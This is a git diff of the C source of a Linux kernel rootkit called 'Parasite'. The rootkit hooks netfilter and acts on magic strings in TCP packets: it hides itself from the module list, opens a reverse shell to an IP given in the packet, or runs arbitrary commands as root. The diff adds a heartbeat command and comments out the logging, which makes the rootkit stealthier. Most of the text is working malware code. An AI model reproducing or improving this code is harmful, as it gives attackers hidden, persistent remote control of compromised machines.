@@ -16,17 +16,19 @@
 #include <linux/udp.h>
 
 // Flags utilized by Parasite to execute various actions
+// PORT - Change this if you want reverse shell to bind elsewhere
 const char* rootkit_hide = "PARASITE_HIDE";
 const char* rootkit_show = "PARASITE_SHOW";
 const char* rootkit_rshell = "PARASITE_RSHELL";
 const char* rootkit_cmd = "PARASITE_CMD";
-const char* PORT = "5555"; // SHELL-PORT: Change this if you want to bind reverse shell on a different port
+const char* rootkit_hb = "PARASITE_HB";
+const char* PORT = "5555";
 
 static struct nf_hook_ops *nfho = NULL;
 // Tracks linked-list LKM list (needed to prevent losing LKM)
 static struct list_head *module_previous;
 // Tracks whether module is hidden (0) or visible(1)
-static int module_track = 0;
+static int module_track = 1;
 
 // Defined vars for establishing reverse shell
 #define HOME "HOME=/root"
@@ -50,15 +52,19 @@ struct command_params {
 // Hides kernel module upon calling
 void hide_rootkit(void)
 {
-	module_previous = THIS_MODULE->list.prev;
-	list_del(&THIS_MODULE->list);
-	module_track = 0;
+	if (module_track != 0) {
+		module_previous = THIS_MODULE->list.prev;
+		list_del(&THIS_MODULE->list);
+		module_track = 0;
+	}
 }
 
 // Puts kernel module back into LKM list
 void show_rootkit(void){
-    list_add(&THIS_MODULE->list, module_previous);
-    module_track = 1;
+	if (module_track != 1) {
+		list_add(&THIS_MODULE->list, module_previous);
+    	module_track = 1;
+	}
 }
 
 
@@ -77,12 +83,14 @@ void execute_reverse_shell(struct work_struct *work){
 	strcat(exec, " ");
     strcat(exec, EXEC_P2);
 
-    printk(KERN_INFO "Starting reverse shell %s\n", exec);
+    //printk(KERN_INFO "Starting reverse shell %s\n", exec);
     
     err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
-    if(err<0){
+    /*
+	if(err<0){
         printk(KERN_INFO "Error executing usermodehelper.\n");
     }
+	*/
     kfree(exec);
     kfree(params->target_ip);
     kfree(params->target_port);
@@ -97,7 +105,7 @@ int start_reverse_shell(char* ip, const char* port){
     int err;
     struct shell_params *params = kmalloc(sizeof(struct shell_params), GFP_KERNEL);
     if(!params){
-        printk(KERN_INFO "Error allocating memory\n");
+        //printk(KERN_INFO "Error allocating memory\n");
         return 1;
     }
     params->target_ip = kstrdup(ip, GFP_KERNEL);
@@ -105,9 +113,11 @@ int start_reverse_shell(char* ip, const char* port){
     INIT_WORK(&params->work, &execute_reverse_shell);
 
     err = schedule_work(&params->work);
-    if(err<0){
+    /*
+	if(err<0){
         printk(KERN_INFO "Error scheduling work of starting shell\n");
     }
+	*/
     return err;
 }
 
@@ -122,9 +132,11 @@ void execute_command(struct work_struct *work)
     strcat(exec, params->command);
 
     err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
-    if(err<0){
+    /*
+	if(err<0){
         printk(KERN_DEBUG "Error executing usermodehelper.\n");
     }
+	*/
     kfree(exec);
     kfree(params->command);
     kfree(params);
@@ -136,16 +148,18 @@ int start_command(char* command)
     int err;
     struct command_params *params = kmalloc(sizeof(struct command_params), GFP_KERNEL);
     if(!params){
-        printk(KERN_DEBUG "Error allocating memory\n");
+        //printk(KERN_DEBUG "Error allocating memory\n");
         return 1;
     }
     params->command = kstrdup(command, GFP_KERNEL);
     INIT_WORK(&params->work, &execute_command);
 
     err = schedule_work(&params->work);
-    if(err<0){
+    /*
+	if(err<0){
         printk(KERN_DEBUG "Error scheduling work of executing command\n");
     }
+	*/
     return err;
 }
 
@@ -165,7 +179,6 @@ static unsigned int hfunc(void *priv, struct sk_buff *skb, const struct nf_hook_
 	// Checks if packet's empty
 	if (!skb)
 		return NF_ACCEPT;
-
 
 	iph = ip_hdr(skb);
 	if (iph->protocol == IPPROTO_TCP) {
@@ -189,11 +202,11 @@ static unsigned int hfunc(void *priv, struct sk_buff *skb, const struct nf_hook_
 
 		// Extracts the data from the packet payload
 		user_data = skb_header_pointer(skb, iph->ihl*4 + tcph->doff*4, size, &_data);
-		printk(KERN_DEBUG "%s\n", user_data); // for debugging purposes
+		//printk(KERN_DEBUG "%s\n", user_data);
 		
 		// If packet contains no data
 		if(!user_data){
-			printk(KERN_INFO "Packet is null!");
+			//printk(KERN_INFO "Packet is null!");
 			kfree(_data);
 			return NF_ACCEPT;
 		}
@@ -210,7 +223,7 @@ static unsigned int hfunc(void *priv, struct sk_buff *skb, const struct nf_hook_
 			return NF_DROP;
 		}
 
-		// ROOTKITRSHELL<IP ADDR> - Takes string, grabs IP address, passes it to reverse-shell functions
+		// ROOTKIT_RSHELL<IP ADDR> - Grabs IP and passed to reverse shell
 		if(memcmp(user_data, rootkit_rshell, strlen(rootkit_rshell)) == 0) {
 
 			//u32 ipsrc = ntohl(iph->saddr); Doesnt work as expected, will fix later
@@ -218,14 +231,14 @@ static unsigned int hfunc(void *priv, struct sk_buff *skb, const struct nf_hook_
 			char* ipsrc = kmalloc(32, GFP_KERNEL);
 			strncpy(ipsrc, user_data + 15, 32);
 
-			//printk(KERN_INFO "IP ADDRESS IS: %s\n", ipsrc); //debugging
+			//printk(KERN_INFO "IP ADDRESS IS: %s\n", ipsrc);
 
 			start_reverse_shell(ipsrc, PORT);
 			kfree(ipsrc);
 			return NF_DROP;
 		}
 
-		// ROOTKITCMD<CMD>
+		// ROOTKIT_CMD<CMD>
 		if(memcmp(user_data, rootkit_cmd, strlen(rootkit_cmd)) == 0) {
 
 			char* cmd = kmalloc(64, GFP_KERNEL);
@@ -233,6 +246,11 @@ static unsigned int hfunc(void *priv, struct sk_buff *skb, const struct nf_hook_
 			//printk(KERN_DEBUG "Parasite cmd: %s", cmd);
 			start_command(cmd);
 			kfree(cmd);
+			return NF_DROP;
+		}
+
+		// ROOTKIT_HB
+		if(memcmp(user_data, rootkit_hb, strlen(rootkit_hb)) == 0) {
 			return NF_DROP;
 		}
 	}
